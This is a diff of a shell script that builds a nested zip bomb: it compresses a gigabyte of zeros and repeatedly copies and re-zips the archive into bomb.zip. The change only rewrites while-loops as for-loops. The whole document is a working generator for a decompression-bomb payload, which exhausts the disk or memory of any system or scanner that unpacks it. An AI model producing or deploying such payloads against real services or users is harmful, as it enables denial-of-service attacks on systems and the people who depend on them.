@@ -3,15 +3,11 @@
 dir=$(mktemp -d /tmp/zipbombXXXX)
 dd if=/dev/zero bs=1M count=1024 | zip $dir/garbage.zip -
 
-i=0
-while [ $i -lt 10 ]; do
-  j=0
-  while [ $j -lt 10 ]; do
+for i in {0..9}; do
+  for j in {0..9}; do
     cp $dir/garbage.zip $dir/$j.zip
-    j=$(($j + 1))
   done
   zip -9 $dir/garbage.zip $dir/?.zip
-  i=$(($i + 1))
 done
 
 zip -9 bomb.zip $dir/garbage.zip
